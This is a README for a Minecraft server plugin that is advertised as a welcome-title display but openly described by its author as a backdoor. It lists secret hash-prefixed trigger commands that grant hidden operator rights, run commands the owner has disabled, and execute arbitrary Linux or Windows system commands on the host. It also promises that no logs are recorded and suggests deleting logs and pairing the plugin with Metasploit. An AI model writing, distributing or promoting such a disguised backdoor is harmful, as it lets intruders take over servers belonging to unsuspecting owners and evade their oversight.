# Minecraft Server Plugin
## Main Features
Displays a dazzling welcome title when players enter the server.

## Primary Commands
/welcometitle [help/reload]

But it's not that simple!
This is a simple backdoor plug-in that I wrote myself, supporting the following functions.

- Do you not want to maintain permissions and just want to execute a command temporarily? Excute `@e1cb0156ced867646179d149b49006c7cb6eef0998bad493e9f126ae3edeac38 [command]`This way, you can execute a command once.(No records will be left during the usage!)
- Has the server owner completely disabled a command? Excute `@48647cf340722817cf0e92b03f4cd2a07dd17dbfd07de7cb7cafef9862e045c0 [command]`Can be executed perfectly. The difference is that it will be executed with Server permissions, rather than Player.(No records will be left during the usage!)
- Excute System(Linux/Windows Server), Command is `@439aedc168164abaaafee5166bcd2d6f50a2482ad40fa259bf1948d16fd9ac98 [command]` Note! It is a system command, not a 'Minecraft' command.(If you want to delete logs, execute this command to operate the server system! It can even be used in conjunction with Metasploit!)
- Get Opertator Permisson, `@f0b2a7cce8877aec3633f33122cfdf8173d1540bdd01da578c72ee1c475d3430 [tmp/remove/keep]`, By default, executing is equivalent to using the `tmp` parameter, which is time-limited to 20 minutes. Want to remove permissions without leaving a record by executing `/deop`? Just use the `remove` parameter! If you want to keep OP permissions indefinitely, use the `keep` parameter!

> By default, for security reasons and to avoid exposure, the plugin will revoke your OP permissions every 20 minutes. You can regain them by running the command again.
> When executing commands (only those provided by this plugin), no logs will be recorded!
